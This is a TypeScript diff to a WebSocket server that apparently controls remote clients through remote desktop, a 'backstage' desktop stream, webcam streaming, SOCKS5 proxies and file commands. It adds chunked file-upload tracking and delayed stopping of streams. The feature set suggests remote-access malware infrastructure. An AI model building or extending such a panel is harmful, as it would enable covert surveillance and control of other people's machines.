@@ -26,7 +26,11 @@ import { stopAllProxiesForClient } from "../socks5-proxy-manager";
 import { verifyBuildToken, isBuildBanned } from "../build-signing";
 import { clearThumbnail } from "../../thumbnails";
 import { stopRemoteDesktopRecording } from "../rd-recording";
-import { requestRemoteDesktopKeyframeAfterScreenshot } from "../ws-console-rd-backstage";
+import {
+  requestRemoteDesktopKeyframeAfterScreenshot,
+  scheduleRdStopAfterLastViewer,
+  scheduleWebcamStopAfterLastViewer,
+} from "../ws-console-rd-backstage";
 import {
   isAuthenticatedViewerRole,
   registerViewerSocket,
@@ -186,11 +190,24 @@ type PendingCommandReply = {
   onProgress?: (payload: any) => void;
 };
 
+type PendingFileUploadChunk = {
+  timeout: ReturnType<typeof setTimeout>;
+  resolve: (value: {
+    ok: boolean;
+    offset?: number;
+    received?: number;
+    total?: number;
+    error?: string;
+  }) => void;
+  clientId: string;
+};
+
 type WsLifecycleDeps = {
   maxClientPayloadBytes: number;
   maxViewerPayloadBytes: number;
   pendingScripts: Map<string, PendingScript>;
   pendingCommandReplies: Map<string, PendingCommandReply>;
+  pendingFileUploadChunks?: Map<string, PendingFileUploadChunk>;
   rdStreamingState: Map<string, unknown>;
   backstageStreamingState: Map<string, unknown>;
   webcamStreamingState: Map<string, unknown>;
@@ -654,6 +671,15 @@ export async function handleWebSocketMessage(
               deps.pendingCommandReplies.delete(cmdId);
             }
           }
+          if (deps.pendingFileUploadChunks) {
+            for (const [cmdId, pending] of deps.pendingFileUploadChunks) {
+              if (pending.clientId === resolvedId) {
+                clearTimeout(pending.timeout);
+                pending.resolve({ ok: false, error: "Client reconnected (superseded)" });
+                deps.pendingFileUploadChunks.delete(cmdId);
+              }
+            }
+          }
           deps.rdStreamingState.delete(resolvedId);
           deps.backstageStreamingState.delete(resolvedId);
           deps.webcamStreamingState.delete(resolvedId);
@@ -838,6 +864,20 @@ export async function handleWebSocketMessage(
       case "file_peek_result":
       case "file_hash_result":
       case "command_result":
+        if (payloadType === "file_upload_result" && typeof (payload as any).commandId === "string") {
+          const chunkPending = deps.pendingFileUploadChunks?.get((payload as any).commandId);
+          if (chunkPending) {
+            clearTimeout(chunkPending.timeout);
+            chunkPending.resolve({
+              ok: Boolean((payload as any).ok),
+              offset: typeof (payload as any).offset === "number" ? (payload as any).offset : undefined,
+              received: typeof (payload as any).received === "number" ? (payload as any).received : undefined,
+              total: typeof (payload as any).total === "number" ? (payload as any).total : undefined,
+              error: typeof (payload as any).error === "string" ? (payload as any).error : undefined,
+            });
+            deps.pendingFileUploadChunks?.delete((payload as any).commandId);
+          }
+        }
         if (payloadType === "command_result" && typeof (payload as any).commandId === "string") {
           const pending = deps.pendingCommandReplies.get((payload as any).commandId);
           if (pending) {
@@ -1034,11 +1074,9 @@ export function handleWebSocketClose(
 
     const stillViewing = sessionManager.hasRdSessionsForClient(removedClientId);
     if (!stillViewing) {
-      const target = clientManager.getClient(removedClientId);
-      deps.sendDesktopCommand(target, "desktop_stop", {});
-      deps.sendDesktopCommand(target, "webrtc_stop", { kind: "desktop" });
-      deps.rdStreamingState.delete(removedClientId);
-      logger.debug(`[rd] cleaned up state for client ${removedClientId}`);
+      // Grace period so Dashboard iframe reloads can claim the stream.
+      scheduleRdStopAfterLastViewer(removedClientId);
+      logger.debug(`[rd] scheduled stop after last viewer left client=${removedClientId}`);
     }
     return;
   }
@@ -1056,11 +1094,8 @@ export function handleWebSocketClose(
 
     const stillViewing = sessionManager.hasWebcamSessionsForClient(removedClientId);
     if (!stillViewing) {
-      const target = clientManager.getClient(removedClientId);
-      deps.sendDesktopCommand(target, "webcam_stop", {});
-      deps.sendDesktopCommand(target, "webrtc_stop", { kind: "webcam" });
-      deps.webcamStreamingState.delete(removedClientId);
-      logger.debug(`[webcam] cleaned up state for client ${removedClientId}`);
+      scheduleWebcamStopAfterLastViewer(removedClientId);
+      logger.debug(`[webcam] scheduled stop after last viewer left client=${removedClientId}`);
     }
     return;
   }
@@ -1165,6 +1200,15 @@ export function handleWebSocketClose(
       clearTimeout(pending.timeout);
       pending.resolve({ ok: false, message: "Client disconnected" });
       deps.pendingCommandReplies.delete(cmdId);
+    }
+  }
+  if (deps.pendingFileUploadChunks) {
+    for (const [cmdId, pending] of deps.pendingFileUploadChunks) {
+      if (pending.clientId === clientId) {
+        clearTimeout(pending.timeout);
+        pending.resolve({ ok: false, error: "Client disconnected" });
+        deps.pendingFileUploadChunks.delete(cmdId);
+      }
     }
   }
   deps.rdStreamingState.delete(clientId);
